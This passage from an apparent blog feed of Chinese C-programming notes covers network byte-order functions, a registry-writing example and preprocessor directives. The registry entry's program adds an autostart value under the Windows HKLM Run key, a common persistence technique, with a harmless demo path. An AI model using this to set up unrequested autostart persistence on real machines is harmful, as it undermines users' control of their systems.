<p>ntohs()–”Network to Host Short”</p>
<p>ntohl()–”Network to Host Long”</p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-08_注册表读写</title>
    <url>/posts/f42908ab/</url>
    <content><![CDATA[<p>32位下 修改注册表（编译后需要使用管理员权限执行  或者先进行提权）</p>
<p>由于是32位的 所以并不会写入到 <code>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 而是写入到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>

<p><code>WOW6432Node</code> 下存放在32位程序的注册表内容</p>
<p><img src="/posts/f42908ab/8-1.png" alt="img"></p>
<p><code>RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_ALL_ACCESS|KEY_WOW64_32KEY, &amp;hkey)</code>   在win10虚拟机尝试是 发现还是写入到32位下的注册表中  win7没成功。。  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	HKEY hkey;</span><br><span class="line">	LPCTSTR reg_path = <span class="string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (ERROR_SUCCESS !=  RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_path, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkey)) &#123;</span><br><span class="line">		GetLastError();   <span class="comment">//返回在eax</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*	_asm &#123;</span></span><br><span class="line"><span class="comment">			push eax</span></span><br><span class="line"><span class="comment">			call printf</span></span><br><span class="line"><span class="comment">			add esp,4</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		<span class="comment">//printf(&quot;123&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(ERROR_SUCCESS != RegSetValueEx(hkey, <span class="string">&quot;aaaaaaaaa&quot;</span>, <span class="number">0</span>, REG_SZ, <span class="string">&quot;C:\\AsmDEMO.exe&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;C:\\AsmDEMO.exe&quot;</span>) + <span class="number">1</span>)) &#123;</span><br><span class="line">		RegCloseKey(hkey);</span><br><span class="line">		GetLastError();</span><br><span class="line">		<span class="comment">//printf(&quot;456&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RegCloseKey(hkey);</span><br><span class="line"></span><br><span class="line">	MessageBoxA(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;设置成功&quot;</span>,MB_OK);</span><br><span class="line">	<span class="comment">//printf(&quot;112&quot;);</span></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/f42908ab/8-2.png" alt="img"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.codenong.com/44199379/">https://www.codenong.com/44199379/</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-07_内联函数</title>
    <url>/posts/7fd9f7c4/</url>
    <content><![CDATA[<p>使用 gcc 查看正常下和 使用内联的区别   gcc -E -O xxxx.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> echo(n) printf(<span class="string">&quot;%d\n&quot;</span>,n);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> hello() printf(<span class="string">&quot;helloworld!\n&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> test() &#123; printf(<span class="string">&quot;123&quot;</span>);\</span></span><br><span class="line"><span class="meta">				 printf(<span class="string">&quot;456&quot;</span>);\</span></span><br><span class="line"><span class="meta">				 printf(<span class="string">&quot;789\n&quot;</span>); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> f(x) f##x();   <span class="comment">//f##x   f1()</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">f1</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;f1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f2</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;f2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	echo(<span class="number">23</span>)  <span class="comment">// ;可加可不加</span></span><br><span class="line">	hello()</span><br><span class="line">	f(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aaaaa 110</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> aaaaa == 10</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;BBBB&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> aaaaa</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;aaaa\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// aaaaa</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>#pragma once </code>  只包含一次</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> n 0 </span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> n == 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> 除数不能为0   <span class="comment">// 会返回一个error</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> n 0 </span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> n == 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> message （<span class="string">&quot;除数不能为0&quot;</span>）</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>





<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">首先三种形式的命令：宏定义，文件包含，条件编译命令。</span><br><span class="line"><span class="number">1</span>、宏定义主要是：<span class="meta">#<span class="keyword">define</span>，#<span class="keyword">undef</span></span></span><br><span class="line">如下：</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.1415926                    <span class="comment">/*不带参数的宏定义*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Max(a,b)  a&gt;b?a:b                    <span class="comment">/*带参数的宏定义*/</span></span></span><br><span class="line">说明：宏定义在C语言与C++语言中是相通的。</span><br><span class="line">下面举例说明定义宏FAILED用于检测数据的正确性。</span><br><span class="line">①<span class="meta">#<span class="keyword">define</span>的应用：</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAILED(Status) ((Status)&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;Please input a integer number(n&gt;0)/n&quot;</span>);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span> ,&amp;d);</span><br><span class="line">&#125;<span class="keyword">while</span>(FAILED(d));</span><br><span class="line">&#125; </span><br><span class="line">其中<span class="keyword">while</span>(FAILED(d))在编译之前被无条件替换为<span class="keyword">while</span>(d&lt;<span class="number">0</span>)。 </span><br><span class="line">宏定义和调用在形式与函数比较相似，但是原理是不同。</span><br><span class="line">②<span class="meta">#<span class="keyword">undef</span>的应用：</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME1 <span class="string">&quot;CONST_NAME1&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> CONST_NAME1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1); <span class="comment">/*错误，CONST_NAME1的定义已经取消*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME2 <span class="string">&quot;CONST_NAME2&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line">在程序的编译的时候，系统提示如下信息</span><br><span class="line">error C2065: <span class="string">&#x27;CONST_NAME1&#x27;</span> : undeclared identifier</span><br><span class="line">出现上述编译错误的原因是，在第二次应用符号常量CONST_NAME1时，此符号常量已经被取消定义。</span><br><span class="line"><span class="number">2</span>、文件包含：</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;文件名&gt;</span> ，这种属于标准方式，用于编译系统指定的文件。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> “文件名”，这种属于用户方式，查找用户当前工作的文件夹中的文件，如果不存在则再按照标准方式查询。</span></span><br><span class="line"><span class="number">3</span>、条件编译（常见的三种形式）：</span><br><span class="line">①第一种形式：</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(或者是<span class="keyword">ifdef</span>)<span class="string">&lt;标识符&gt;</span></span></span><br><span class="line">&lt;程序段<span class="number">1</span>&gt;</span><br><span class="line">[<span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">&lt;程序段<span class="number">2</span>&gt;]</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">②第二种形式：</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(或者是<span class="keyword">ifndef</span>)<span class="string">&lt;标识符&gt;</span></span></span><br><span class="line">&lt;程序段<span class="number">1</span>&gt;</span><br><span class="line">[<span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">&lt;程序段<span class="number">2</span>&gt;]</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">③第三种形式常用与C++编译器中。</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> …</span></span><br><span class="line">[<span class="meta">#<span class="keyword">elif</span> … ]</span></span><br><span class="line">[<span class="meta">#<span class="keyword">elif</span> …]</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> …</span></span><br><span class="line"> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="number">4</span>、其他条件编译命令：</span><br><span class="line">①<span class="meta">#<span class="keyword">error</span>:</span></span><br><span class="line">语法格式如下：</span><br><span class="line"><span class="meta">#<span class="keyword">error</span> token-sequence</span></span><br><span class="line">其主要的作用是在编译的时候输出编译错误信息token-sequence，从方便程序员检查程序中出现的错误。例如下面的程序</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME1 <span class="string">&quot;CONST_NAME1&quot;</span></span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> CONST_NAME1</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONST_NAME1</span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> No defined Constant Symbol CONST_NAME1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME2 <span class="string">&quot;CONST_NAME2&quot;</span></span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">在编译的时候输出如编译信息</span><br><span class="line">fatal error C1189: <span class="meta">#<span class="keyword">error</span> : No defined Constant Symbol CONST_NAME1</span></span><br><span class="line">②<span class="meta"># <span class="keyword">pragma</span></span></span><br><span class="line">在编写程序的时候,我们经常要用到<span class="meta">#<span class="keyword">pragma</span> 指令来设定编译器的状态或者是指示编译器完成一些特定的动作. </span></span><br><span class="line">下面介绍了一下该指令的一些常用参数,希望对大家有所帮助!</span><br><span class="line">一般格式：<span class="meta">#<span class="keyword">pragma</span> para </span></span><br><span class="line">一、  message 参数。 </span><br><span class="line">message </span><br><span class="line">它能够在编译信息输出窗 </span><br><span class="line">口中输出相应的信息，这对于源代码信息的控制是非常重要的。其使用方法为： </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> message(“消息文本”) </span></span><br><span class="line">当编译器遇到这条指令时就在编译输出窗口中将消息文本打印出来。 </span><br><span class="line">当我们在程序中定义了许多宏来控制源代码版本的时候，我们自己有可能都会忘记有没有正确的设置这些宏，此时我们可以用这条 </span><br><span class="line">指令在编译的时候就进行检查。假设我们希望判断自己有没有在源代码的什么地方定义了_X86这个宏可以用下面的方法 </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86 </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> message(“_X86 macro activated!”) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line">当我们定义了_X86这个宏以后，应用程序在编译时就会在编译输出窗口里显示“_ </span><br><span class="line">X86 macro activated!”。我们就不会因为不记得自己定义的一些特定的宏而抓耳挠腮了 </span><br><span class="line">二、  另一个使用得比较多的<span class="meta">#<span class="keyword">pragma</span>参数是code_seg，驱动开发使用比较多，应用用不到。格式如： </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg( [ [ &#123; push | pop&#125;, ] [ identifier, ] ] [ <span class="string">&quot;segment-name&quot;</span> [, <span class="string">&quot;segment-class&quot;</span> ] ) </span></span><br><span class="line">该指令用来指定函数在.obj文件中存放的节,观察OBJ文件可以使用VC自带的dumpbin命令行程序,函数在.obj文件中默认的存放节 </span><br><span class="line">为.text节 </span><br><span class="line">如果code_seg没有带参数的话,则函数存放在.text节中 </span><br><span class="line">push (可选参数) 将一个记录放到内部编译器的堆栈中,可选参数可以为一个标识符或者节名 </span><br><span class="line">pop(可选参数) 将一个记录从堆栈顶端弹出,该记录可以为一个标识符或者节名 </span><br><span class="line">identifier (可选参数) 当使用push指令时,为压入堆栈的记录指派的一个标识符,当该标识符被删除的时候和其相关的堆栈中的记录将被弹出堆栈 </span><br><span class="line"><span class="string">&quot;segment-name&quot;</span> (可选参数) 表示函数存放的节名 </span><br><span class="line">例如: </span><br><span class="line"><span class="comment">//默认情况下,函数被存放在.text节中 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123; <span class="comment">// stored in .text </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//将函数存放在.my_data1节中 </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;.my_data1&quot;</span>) </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">()</span> &#123; <span class="comment">// stored in my_data1 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//r1为标识符,将函数放入.my_data2节中 </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(push, r1, <span class="string">&quot;.my_data2&quot;</span>) </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123; <span class="comment">// stored in my_data2 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; </span><br><span class="line">&#125; </span><br><span class="line">三、   <span class="meta">#<span class="keyword">pragma</span> once (比较常用） </span></span><br><span class="line"> </span><br><span class="line">这是一个比较常用的指令,只要在头文件的最开始加入这条指令就能够保证头文件被编译一次 </span><br><span class="line">四、   <span class="meta">#<span class="keyword">pragma</span> hdrstop表示预编译头文件到此为止，后面的头文件不进行预编译。 </span></span><br><span class="line">BCB可以预编译头文件以加快链接的速度，但如果所有头文件都进行预编译又可能占太多磁盘空间，所以使用这个选项排除一些头文件。 </span><br><span class="line">有时单元之间有依赖关系，比如单元A依赖单元B，所以单元B要先于单元A编译。你可以用<span class="meta">#<span class="keyword">pragma</span> startup指定编译优先级， </span></span><br><span class="line">如果使用了<span class="meta">#<span class="keyword">pragma</span> package(smart_init) ，BCB就会根据优先级的大小先后编译。 </span></span><br><span class="line">五、   <span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>指令 </span></span><br><span class="line">该指令允许有选择性的修改编译器的警告消息的行为 </span><br><span class="line">指令格式如下: </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( <span class="keyword">warning</span>-specifier : <span class="keyword">warning</span>-number-list [; <span class="keyword">warning</span>-specifier : <span class="keyword">warning</span>-number-list...] </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push[ ,n ] ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop ) </span></span><br><span class="line">主要用到的警告表示有如下几个: </span><br><span class="line">once:只显示一次(警告/错误等)消息 </span><br><span class="line"><span class="keyword">default</span>:重置编译器的警告行为到默认状态 </span><br><span class="line"><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>:四个警告级别 </span><br><span class="line">disable:禁止指定的警告信息 </span><br><span class="line">error:将指定的警告信息作为错误报告 </span><br><span class="line">如果大家对上面的解释不是很理解,可以参考一下下面的例子及说明 </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 4507 34; once : 4385; <span class="keyword">error</span> : 164 ) </span></span><br><span class="line">等价于： </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4507 34) <span class="comment">// 不显示4507和34号警告信息 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(once:4385) <span class="comment">// 4385号警告信息仅报告一次 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(<span class="keyword">error</span>:164) <span class="comment">// 把164号警告信息作为一个错误。 </span></span></span><br><span class="line">同时这个pragma warning 也支持如下格式： </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push [ ,n ] ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop ) </span></span><br><span class="line">这里n代表一个警告等级(<span class="number">1</span>--<span class="number">-4</span>)。 </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push )保存所有警告信息的现有的警告状态。 </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push, n)保存所有警告信息的现有的警告状态，并且把全局警告 </span></span><br><span class="line">等级设定为n。 </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop )向栈中弹出最后一个警告信息，在入栈和出栈之间所作的 </span></span><br><span class="line">一切改动取消。例如： </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( push ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 4705 ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 4706 ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( disable : 4707 ) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>( pop ) </span></span><br><span class="line">在这段代码的最后，重新保存所有的警告信息(包括<span class="number">4705</span>，<span class="number">4706</span>和<span class="number">4707</span>) </span><br><span class="line">在使用标准C++进行编程的时候经常会得到很多的警告信息,而这些警告信息都是不必要的提示, </span><br><span class="line">所以我们可以使用<span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4786)来禁止该类型的警告 </span></span><br><span class="line">在vc中使用ADO的时候也会得到不必要的警告信息,这个时候我们可以通过 </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4146)来消除该类型的警告信息 </span></span><br><span class="line">六、  pragma <span class="title function_">comment</span><span class="params">(...)</span> </span><br><span class="line">该指令的格式为 </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment( <span class="string">&quot;comment-type&quot;</span> [, commentstring] ) </span></span><br><span class="line">该指令将一个注释记录放入一个对象文件或可执行文件中, </span><br><span class="line">comment-<span class="title function_">type</span><span class="params">(注释类型)</span>:可以指定为五种预定义的标识符的其中一种 </span><br><span class="line">五种预定义的标识符为: </span><br><span class="line">compiler:将编译器的版本号和名称放入目标文件中,本条注释记录将被编译器忽略 </span><br><span class="line">如果你为该记录类型提供了commentstring参数,编译器将会产生一个警告 </span><br><span class="line">例如:<span class="meta">#<span class="keyword">pragma</span> comment( compiler ) </span></span><br><span class="line">exestr:将commentstring参数放入目标文件中,在链接的时候这个字符串将被放入到可执行文件中, </span><br><span class="line">当操作系统加载可执行文件的时候,该参数字符串不会被加载到内存中.但是,该字符串可以被 </span><br><span class="line">dumpbin之类的程序查找出并打印出来,你可以用这个标识符将版本号码之类的信息嵌入到可 </span><br><span class="line">执行文件中! </span><br><span class="line">lib:这是一个非常常用的关键字,用来将一个库文件链接到目标文件中 </span><br><span class="line">常用的lib关键字，可以帮我们连入一个库文件。 </span><br><span class="line">例如: </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;user32.lib&quot;</span>) </span></span><br><span class="line">该指令用来将user32.lib库文件加入到本工程中 </span><br><span class="line">linker:将一个链接选项放入目标文件中,你可以使用这个指令来代替由命令行传入的或者在开发环境中 </span><br><span class="line">设置的链接选项,你可以指定/include选项来强制包含某个对象,例如: </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/include:__mySymbol&quot;</span>) </span></span><br><span class="line">你可以在程序中设置下列链接选项 </span><br><span class="line">/DEFAULTLIB </span><br><span class="line">/EXPORT </span><br><span class="line">/INCLUDE </span><br><span class="line">/MERGE </span><br><span class="line">/SECTION </span><br><span class="line">这些选项在这里就不一一说明了,详细信息请看msdn! </span><br><span class="line">user:将一般的注释信息放入目标文件中commentstring参数包含注释的文本信息,这个注释记录将被链接器忽略 </span><br><span class="line">例如: </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment( user, <span class="string">&quot;Compiled on &quot;</span> __DATE__ <span class="string">&quot; at &quot;</span> __TIME__ ) </span></span><br><span class="line">补充一个 </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(n) </span></span><br><span class="line">控制对齐 如 </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push) </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1) </span></span><br><span class="line"><span class="keyword">struct</span> s_1&#123; </span><br><span class="line"><span class="type">char</span> szname[<span class="number">1</span>]; </span><br><span class="line"><span class="type">int</span> a; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop) </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s_2</span>&#123;</span> </span><br><span class="line"><span class="type">char</span> szname[<span class="number">1</span>]; </span><br><span class="line"><span class="type">int</span> a; </span><br><span class="line">&#125;; </span><br><span class="line">则 </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;s_1 size : %d/n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> s_1)); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;s_2 size : %d/n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> s_2)); </span><br><span class="line">得到<span class="number">5</span>，<span class="number">8</span>。</span><br><span class="line"> (<span class="number">5</span>) <span class="meta">#<span class="keyword">pragma</span> resource <span class="string">&quot;*.dfm&quot;</span>表示把*.dfm文件中的资源加入工程。*.dfm中包括窗体</span></span><br><span class="line">外观的定义。 </span><br><span class="line">件。</span><br><span class="line">(<span class="number">8</span>) progma pack（n）</span><br><span class="line">指定结构体对齐方式！<span class="meta">#<span class="keyword">pragma</span> pack(n)来设定变量以n字节对齐方式。n字节对齐就是说变量存放的起始地址的偏移量有两种情况：第一、如果n大于等于该变量所占用的字节数，那么偏 移量必须满足默认的对齐方式，第二、如果n小于该变量的类型所占用的字节数，那么偏移量为n的倍数，不用满足默认的对齐方式。结构的总大小也有个约束条 件，分下面两种情况：如果n大于所有成员变量类型所占用的字节数，那么结构的总大小必须为占用空间最大的变量占用的空间数的倍数； </span></span><br><span class="line">　　否则必须为n的倍数。下面举例说明其用法。 </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push) <span class="comment">//保存对齐状态</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(4)<span class="comment">//设定为4字节对齐</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> m1;</span><br><span class="line"><span class="type">double</span> m4;</span><br><span class="line"><span class="type">int</span> m3;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)<span class="comment">//恢复对齐状态 </span></span></span><br><span class="line">为测试该功能，可以使用<span class="keyword">sizeof</span>（）测试结构体的长度！</span><br><span class="line">③<span class="meta">#<span class="keyword">line</span></span></span><br><span class="line">此命令主要是为强制编译器按指定的行号，开始对源程序的代码重新编号，在调试的时候，可以按此规定输出错误代码的准确位置。</span><br><span class="line">形式<span class="number">1</span></span><br><span class="line">语法格式如下:</span><br><span class="line"><span class="meta"># <span class="keyword">line</span> constant “filename”:其作用是使得其后的源代码从指定的行号constant重新开始编号，并将当前文件的名命名为filename。例如下面的程序如下：</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">line</span> 10 <span class="string">&quot;Hello.c&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME1 <span class="string">&quot;CONST_NAME1&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> CONST_NAME1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1);</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME2 <span class="string">&quot;CONST_NAME2&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span 